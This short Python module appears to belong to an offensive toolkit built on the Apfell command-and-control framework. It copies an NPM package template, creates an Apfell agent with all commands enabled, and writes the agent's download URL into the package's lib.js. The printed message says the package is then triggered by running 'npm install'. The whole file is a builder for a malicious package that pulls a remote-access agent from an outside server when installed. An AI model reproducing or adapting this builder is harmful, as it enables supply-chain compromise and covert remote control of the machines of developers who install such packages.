import os
import asyncio
from .Utilities import *

def npm_package():
    temp = "./Templates/NodeJS_NPM_Package/"
    payload = "./Payloads/NodeJS_NPM_Package_Payload/"

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="NodeJS NPM Package",
                                                     filename="NodeJS_NPM_Package.js",
                                                     include_all_commands=True)
        url = await get_payload_download_url(payload_info)

        # Replace template values
        templateString = "URL"
        modifyFile = payload + "lib.js"

        fin = open(modifyFile, "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()

        fin = open(modifyFile, "wt")
        fin.write(data)
        fin.close()

        #  Build the payload 
        print("[*] Building NodeJS NPM Package")
        os.system("chmod +x " + modifyFile)
        print("[*] Done! Execute using NodeJS 'npm install' within folder")

    async def main():
        await scripting()

    asyncio.run(main())
